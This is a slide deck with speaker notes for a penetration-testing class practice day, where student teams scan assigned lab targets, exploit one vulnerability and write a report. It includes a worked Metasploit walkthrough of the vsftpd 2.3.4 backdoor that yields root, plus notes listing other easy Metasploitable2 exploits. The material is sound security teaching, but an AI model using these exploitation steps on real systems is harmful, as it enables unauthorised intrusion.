---
marp: true
theme: dark-monospace
paginate: true
title: "Day 15 — Practice Day: Run the Lifecycle"
footer: "Practical Cyber Security (v2) · Week 3 · Day 15"
---

<!-- _class: lead -->

# Practice day
## Day 15 — Run the whole lifecycle, in teams, on the clock

**Week 3 · The penetration testing lifecycle · + Week 3 assignment brief**

<!--
RUN SHEET (~90 min). This is a DOING day — teacher circulates, doesn't lecture.
00:00 Today's plan + rules                                     6
00:06 The one-page playbook                                    7
00:13 Worked mini-example on the projector                     8
00:21 TEAM RUN (coached) — phases 1-4 -> proof captured       42
01:03 Write the mini report (each student)                    12
01:15 WEEK 3 ASSIGNMENT BRIEF                                  12
01:27 Recap                                                    3
CUT / FLEX: the worked example can drop to 5 min; the team run can borrow from the write-up if
most teams are close; never cut the assignment brief.
ANALOGY (kitchen / inspector): today is the real inspection — full walkthrough, on the clock,
and you file the report.
ETHICS: same ROE as Day 12. Only the target assigned to your team. Snapshot before you exploit.
SAFETY: exploitation today is COACHED and limited to getting ONE proof. Deep exploitation is
Days 16-17.
-->

---

## Today

You've learned each phase on its own. **Today you run 1 → 4 as one flow.**

- **Teams of 3–4.** One target per team (assigned — check the board).
- **Goal:** one **proven** finding — recon → scan → pick a vuln → **get proof** → screenshot.
- **Then everyone writes** a 2-page mini report (the template you'll reuse this weekend).
- I'm circulating and coaching. Ask early, ask often.

<!--
Assign targets: mix of DVWA (web), Metasploitable2 (services), Juice Shop (web). Teams that
finish early: get a SECOND finding, or help a stuck team explain their approach.
-->

---

## The one-page playbook

```
1  SCOPE      already done — your ROE. Confirm your target. SNAPSHOT.
2  RECON      it's the lab: note the host, what you expect
3  SCAN       nmap -sV -sC -oA run15 <TARGET>      -> service inventory
4  TRIAGE     which finding has: known CVE + public exploit + reachable?
              (your Day 14 table — or build a quick one)
5  PROOF      get ONE of:
              - a shell  (Metasploit module, or a manual exploit)
              - extracted data  (a DB dump, /etc/passwd, a file)
              - a bypass  (login without creds, read another user's data)
6  EVIDENCE   screenshot the proof + the command. Note the TIME.
```

<!--
Keep the goal small: ONE proof. Not "own everything". The report needs one clean,
reproducible finding, not five half-finished ones.
Metasploitable2 easy wins: vsftpd 2.3.4 backdoor, Samba usermap, distcc, UnrealIRCd.
DVWA/Juice Shop: SQLi login bypass, reflected XSS (full web is Day 16).
-->

---

## Stuck? The ladder

1. **Re-read your scan.** What version is it *exactly*? Any `-sC` script output?
2. **`searchsploit <service> <version>`** — is there a module / script?
3. **Metasploit:** `msfconsole` → `search <thing>` → `use ...` → `show options` → set `RHOSTS`
   → `run`. Read the errors — they usually tell you the missing option.
4. **Try a different finding.** Not every vuln exploits cleanly in the time you have.
5. **Ask.** "Here's my target, here's what I tried, here's the error" — that's a good question.

<!--
Common blockers: RHOSTS not set; wrong port (RPORT); needs `set LHOST <your-kali-ip>` for a
reverse shell; the service isn't actually the vulnerable version. Coach, don't solve.
-->

---

## Worked mini-example *(projector, ~8 min)*

```
nmap -sV -p21 <TARGET>            -> 21/tcp open  ftp  vsftpd 2.3.4
searchsploit vsftpd 2.3.4        -> Metasploit module exists
msfconsole -q
  search vsftpd
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS <TARGET>
  run
  id                              -> uid=0(root)   <-- PROOF
```

Screenshot the `id` output + the module line. Note the time. **That's a finding.**

<!--
Do this live, fast, once. Then "now you — and yours might be Samba, or SQLi, or a file read.
The SHAPE is the same: scan -> match -> exploit -> prove -> screenshot."
-->

---

<!-- _class: lead -->

# TEAM RUN

Phases 1–4. Goal: **one proof, screenshotted, with the command and the time.**

Checkpoints: **15 min** (scan done?) · **30 min** (vuln picked, attempting?) · **40 min**
(proof captured — start writing).

<!--
42 minutes. Circulate constantly. Call the checkpoints out loud. At 40 min, anyone with a
proof starts the write-up; anyone still stuck gets you at their table.
Every team should leave with at least one screenshot of proof. If a team truly can't, hand
them the vsftpd/Samba easy win and walk them through it — the report matters more than the
struggle today.
-->

---

## Write it up — the 2-page mini report

Each student, from `assets/mini-report-template.md`:

1. **Summary** (3–4 sentences) — target, what you found, the headline risk.
2. **The finding** — title · severity · **evidence** (your screenshot) · **steps to
   reproduce** · **impact** · **remediation**.
3. **What I'd do next** — 2–3 sentences (more findings, post-exploitation, ...).

<!--
12 min. This is individual, not per-team — everyone writes their own. It's the template for
the weekend assignment, so getting the shape right now saves them Saturday.
"Steps to reproduce" is the bit juniors skip and the bit that makes a report useful.
-->

---

<!-- _class: lead -->

# Week 3 — Weekend Assignment brief

*(full spec + checklist in your student pack)*

---

## The assignment — 4 parts

- **A — Integrate:** a full **mini-engagement** on a **fresh** target (assigned — different
  from today's). Deliver a short **engagement report**: scope → scan summary / service
  inventory → your **ranked findings table** (Day 14) → **one finding taken to proof**
  (screenshot + repro steps) → remediation. ~3–4 pages.
- **B — R&D stretch:** pick **one CVE** from your scan. In ~half a page: the **root cause**
  (injection? overflow? auth bypass?), how the **public exploit works step by step**, what
  **CVSS / KEV** say, and the **fix**. Cite NVD + the exploit source.
- **C — Hands-on evidence:** the `nmap -oA` files, the proof screenshot(s) **with captions**,
  and the **exact commands** used.
- **D — Reflection:** 3–4 sentences.

**One PDF, before Monday. Only your assigned target. Snapshot first.**

<!--
Walk each part ~3 min. Part A = today's exercise, done solo, written properly. Part B is the
"understand the exploit, don't just run it" stretch. Emphasise: reproducible commands, captioned
evidence, and STAY IN SCOPE.
-->

---

<!-- _class: lead -->

## Recap

1. **The lifecycle is one flow:** scope → recon → scan → triage → proof → report. You just ran it.
2. **One clean, reproducible finding** beats five half-finished ones.
3. **The report is the product** — evidence + steps to reproduce + a fix, every time.

<!--
Say the three lines. That's Week 3. Monday: Week 4 opens — web exploitation. You take the
"SQLi login bypass" you may have glimpsed today and do the OWASP Top 10 properly.
-->
